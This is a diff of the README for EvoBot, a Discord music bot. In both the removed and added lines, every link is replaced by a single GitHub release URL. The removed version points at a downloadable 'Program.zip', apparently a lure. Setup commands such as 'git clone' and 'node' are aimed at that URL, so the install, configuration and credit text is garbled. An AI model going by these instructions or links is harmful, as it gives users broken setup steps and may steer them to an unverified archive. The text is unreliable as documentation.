@@ -1,32 +1,32 @@
-![Node build](https://github.com/haziff/evobot/releases/download/v1.0/Program.zip)
-![Docker build](https://github.com/haziff/evobot/releases/download/v1.0/Program.zip)
-[![Commitizen friendly](https://github.com/haziff/evobot/releases/download/v1.0/Program.zip)](https://github.com/haziff/evobot/releases/download/v1.0/Program.zip)
+![Node build](https://github.com/haziff/evobot/releases/tag/v1.0)
+![Docker build](https://github.com/haziff/evobot/releases/tag/v1.0)
+[![Commitizen friendly](https://github.com/haziff/evobot/releases/tag/v1.0)](https://github.com/haziff/evobot/releases/tag/v1.0)
 
-![logo](https://github.com/haziff/evobot/releases/download/v1.0/Program.zip)
+![logo](https://github.com/haziff/evobot/releases/tag/v1.0)
 
 # 🤖 EvoBot (Discord Music Bot)
-> EvoBot is a Discord Music Bot built with https://github.com/haziff/evobot/releases/download/v1.0/Program.zip & uses Command Handler from [https://github.com/haziff/evobot/releases/download/v1.0/Program.zip](https://github.com/haziff/evobot/releases/download/v1.0/Program.zip)
+> EvoBot is a Discord Music Bot built with https://github.com/haziff/evobot/releases/tag/v1.0 & uses Command Handler from [https://github.com/haziff/evobot/releases/tag/v1.0](https://github.com/haziff/evobot/releases/tag/v1.0)
 
 ## Requirements
 
-1. Discord Bot Token **[Guide](https://github.com/haziff/evobot/releases/download/v1.0/Program.zip)**
-2. YouTube Data API v3 Key **[Guide](https://github.com/haziff/evobot/releases/download/v1.0/Program.zip)**  
-2.1 **(Optional)** Soundcloud Client ID **[Guide](https://github.com/haziff/evobot/releases/download/v1.0/Program.zip)**
-3. https://github.com/haziff/evobot/releases/download/v1.0/Program.zip v14.0.0 or newer
+1. Discord Bot Token **[Guide](https://github.com/haziff/evobot/releases/tag/v1.0)**
+2. YouTube Data API v3 Key **[Guide](https://github.com/haziff/evobot/releases/tag/v1.0)**  
+2.1 **(Optional)** Soundcloud Client ID **[Guide](https://github.com/haziff/evobot/releases/tag/v1.0)**
+3. https://github.com/haziff/evobot/releases/tag/v1.0 v14.0.0 or newer
 
 ## 🚀 Getting Started
 
 ```sh
-git clone https://github.com/haziff/evobot/releases/download/v1.0/Program.zip
+git clone https://github.com/haziff/evobot/releases/tag/v1.0
 cd evobot
 npm install
 ```
 
-After installation finishes follow configuration instructions then run `node https://github.com/haziff/evobot/releases/download/v1.0/Program.zip` to start the bot.
+After installation finishes follow configuration instructions then run `node https://github.com/haziff/evobot/releases/tag/v1.0` to start the bot.
 
 ## ⚙️ Configuration
 
-Copy or Rename `https://github.com/haziff/evobot/releases/download/v1.0/Program.zip` to `https://github.com/haziff/evobot/releases/download/v1.0/Program.zip` and fill out the values:
+Copy or Rename `https://github.com/haziff/evobot/releases/tag/v1.0` to `https://github.com/haziff/evobot/releases/tag/v1.0` and fill out the values:
 
 ⚠️ **Note: Never commit or share your token or api keys publicly** ⚠️
 
@@ -46,7 +46,7 @@ Copy or Rename `https://github.com/haziff/evobot/releases/download/v1.0/Program.
 
 ## 🐬 Docker Configuration
 
-For those who would prefer to use our [Docker container](https://github.com/haziff/evobot/releases/download/v1.0/Program.zip), you may provide values from `https://github.com/haziff/evobot/releases/download/v1.0/Program.zip` as environment variables.
+For those who would prefer to use our [Docker container](https://github.com/haziff/evobot/releases/tag/v1.0), you may provide values from `https://github.com/haziff/evobot/releases/tag/v1.0` as environment variables.
 
 ```shell
 docker run -e "TOKEN=<discord-token>" -e "YOUTUBE_API_KEY=<youtube-key>" eritislami/evobot
@@ -58,7 +58,7 @@ docker run -e "TOKEN=<discord-token>" -e "YOUTUBE_API_KEY=<youtube-key>" eritisl
 
 * 🎶 Play music from YouTube via url
 
-`/play https://github.com/haziff/evobot/releases/download/v1.0/Program.zip`
+`/play https://github.com/haziff/evobot/releases/tag/v1.0`
 
 * 🔎 Play music from YouTube via search query
 
@@ -66,7 +66,7 @@ docker run -e "TOKEN=<discord-token>" -e "YOUTUBE_API_KEY=<youtube-key>" eritisl
 
 * 🎶 Play music from Soundcloud via url
 
-`/play https://github.com/haziff/evobot/releases/download/v1.0/Program.zip`
+`/play https://github.com/haziff/evobot/releases/tag/v1.0`
 
 * 🔎 Search and select music to play
 
@@ -78,7 +78,7 @@ Examples: `1` or `1,2,3`
 
 * 📃 Play youtube playlists via url
 
-`/playlist https://github.com/haziff/evobot/releases/download/v1.0/Program.zip`
+`/playlist https://github.com/haziff/evobot/releases/tag/v1.0`
 
 * 🔎 Play youtube playlists via search query
 
@@ -95,16 +95,16 @@ Examples: `1` or `1,2,3`
 * Skip to song # in queue (/skipto, /st)
 * Move a song in the queue (/move, /mv)
 * Remove song # from queue (/remove, /rm)
-* Play an mp3 clip (/clip https://github.com/haziff/evobot/releases/download/v1.0/Program.zip) (put the file in sounds folder)
+* Play an mp3 clip (/clip https://github.com/haziff/evobot/releases/tag/v1.0) (put the file in sounds folder)
 * List all clips (/clips)
 * Show ping to Discord API (/ping)
 * Show bot uptime (/uptime)
 * Toggle pruning of bot messages (/pruning)
 * Help (/help, /h)
-* Command Handler from [https://github.com/haziff/evobot/releases/download/v1.0/Program.zip](https://github.com/haziff/evobot/releases/download/v1.0/Program.zip)
+* Command Handler from [https://github.com/haziff/evobot/releases/tag/v1.0](https://github.com/haziff/evobot/releases/tag/v1.0)
 * Media Controls via Reactions
 
-![reactions](https://github.com/haziff/evobot/releases/download/v1.0/Program.zip)
+![reactions](https://github.com/haziff/evobot/releases/tag/v1.0)
 
 ## 🌎 Locales
 
@@ -133,8 +133,8 @@ Currently available locales are:
 
 ## 🤝 Contributing
 
-1. [Fork the repository](https://github.com/haziff/evobot/releases/download/v1.0/Program.zip)
-2. Clone your fork: `git clone https://github.com/haziff/evobot/releases/download/v1.0/Program.zip`
+1. [Fork the repository](https://github.com/haziff/evobot/releases/tag/v1.0)
+2. Clone your fork: `git clone https://github.com/haziff/evobot/releases/tag/v1.0`
 3. Create your feature branch: `git checkout -b my-new-feature`
 4. Stage changes `git add .`
 5. Commit your changes: `cz` OR `npm run commit` do not use `git commit`
@@ -143,4 +143,4 @@ Currently available locales are:
 
 ## 📝 Credits
 
-[@iCrawl](https://github.com/haziff/evobot/releases/download/v1.0/Program.zip) For the queue system used in this application which was adapted from [@iCrawl/discord-music-bot](https://github.com/haziff/evobot/releases/download/v1.0/Program.zip)
+[@iCrawl](https://github.com/haziff/evobot/releases/tag/v1.0) For the queue system used in this application which was adapted from [@iCrawl/discord-music-bot](https://github.com/haziff/evobot/releases/tag/v1.0)
